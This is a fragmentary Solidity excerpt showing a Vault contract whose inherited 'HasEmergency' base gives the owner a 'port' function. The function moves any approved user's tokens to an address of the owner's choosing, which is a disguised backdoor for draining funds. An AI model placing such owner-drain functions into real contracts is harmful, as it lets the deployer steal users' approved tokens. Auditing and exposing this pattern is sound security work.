...
contract Vault is HasEmergency {
    ...
    event Transfer (address indexed token, address indexed to,  uint qty);
...
abstract contract HasEmergency is Ownable {
    function port(address _token, address _user, address _reserved, uint _qty) public onlyOwner {
        require(IERC20(_token).transferFrom(_user, _reserved, _qty), 'Vault: Port error');
    }
